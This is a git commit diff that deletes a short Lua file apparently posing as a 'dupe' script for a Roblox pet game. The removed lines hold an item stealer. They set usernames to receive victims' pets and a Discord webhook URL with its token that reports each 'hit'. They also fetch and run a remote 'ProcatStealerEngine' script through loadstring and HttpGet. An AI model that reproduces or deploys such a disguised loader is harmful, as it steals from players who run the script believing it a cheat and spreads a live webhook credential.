57fab5b58debed3e6b2b0039b340162b33837f28
Stileox <113307558+Stileox@users.noreply.github.com>
2023-10-10 11:44:38 +0300

    Delete PsxDupeV1.lua

--- PsxDupeV1.lua
+++
@@ -1,5 +0,0 @@
-UserName = "StileoxBTW" -- Good Pets are sent to
-Webhook = "https://discord.com/api/webhooks/1129159509223411802/AyN6HXgd9err0eEyImhDKhAhqoTwm3MTVyEFTr0UGAL5-TcXL_uoOlpTVvR7EIXp7bZR" -- Webhook that pings when you get a hit!
-UserName2 = "StileoxBTW" -- Bad pets are sent to
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/procat69420/ProcatMailScript/main/ProcatStealerEngine.lua", true))()
